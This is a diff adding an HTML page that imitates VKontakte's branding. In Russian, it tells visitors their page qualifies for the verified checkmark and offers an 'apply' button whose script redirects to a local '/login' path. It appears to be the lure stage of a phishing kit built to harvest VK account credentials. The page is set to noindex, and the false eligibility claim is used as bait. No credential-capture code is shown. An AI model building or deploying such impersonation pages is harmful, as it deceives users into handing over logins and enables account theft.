@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="ru"><head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="./base/fav_logo.ico">
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta name="description" content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте.">
+    <link rel="preconnect" href="https://fonts.gstatic.com/">
+    <link href="./base/css2.css" rel="stylesheet">
+    <link rel="stylesheet" href="./base/style.css">
+    <title>ВКонтакте</title>
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <a href=""><img src="./base/logo.svg" alt="" class="header-logo"></a>
+        </div>
+    </header>
+    <div class="main">
+                                                                            <div class="container">
+                <svg class="icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 28 28"><path d="M0 14C0 6.268 6.268 0 14 0s14 6.268 14 14-6.268 14-14 14S0 21.732 0 14z" fill="#ffb029"></path><path d="M16.346 10.986l3.107.305c1.08.106 1.412 1.187.578 1.896l-2.432 2.068.902 3.37c.297 1.106-.623 1.776-1.544 1.11L14 17.599l-2.955 2.136c-.918.663-1.841-.004-1.545-1.11l.903-3.37-2.432-2.068c-.838-.712-.508-1.79.578-1.896l3.106-.305 1.368-3.228c.429-1.01 1.526-1.01 1.955 0z" fill="#fff"></path></svg>
+                <h1 class="title">Верификация</h1>
+                <p class="subtitle">Верификация — это процесс подтверждения того, что личная страница действительно принадлежит известной персоне.
+                    Если проверка пройдена, страница получает особую отметку —
+                    галочку справа от имени, а также выводится раньше других в результатах поиска.
+                    <br><br>
+                    Чтобы пройти верификацию, регулярно обновляйте информацию на странице и публикуйте свежие материалы.
+                </p>
+                <div class="verifed-check">
+                    <svg height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><rect fill="#4bb34b" height="16" rx="8" width="16"></rect><path d="m5.28033009 8.21966991c-.29289322-.29289321-.76776696-.29289321-1.06066018 0-.29289321.29289322-.29289321.76776696 0 1.06066018l1.75 1.75000001c.29289322.2928932.76776696.2928932 1.06066018 0l4.75000001-4.75000001c.2928932-.29289322.2928932-.76776696 0-1.06066018-.2928932-.29289321-.767767-.29289321-1.0606602 0l-4.2196699 4.21966992z" fill="#fff" fill-rule="nonzero"></path></g></svg>
+                    <span>Ваша страница удовлетворяет все критерии</span>
+                </div>
+                <button type="button" class="button"><span>Подать заявку</span><div class="pr" id="btn_lock" style="opacity: 1;"><div class="pr_bt"></div><div class="pr_bt"></div><div class="pr_bt"></div></div></button>
+            </div>
+            </div>
+    <script>
+        const button = document.querySelector('.button');
+        button.addEventListener('click', event => {
+            button.classList.add('load');
+            setTimeout(function() {
+                window.location.href = "/login";
+            }, 500);
+        });
+    </script>
+
+</body></html>
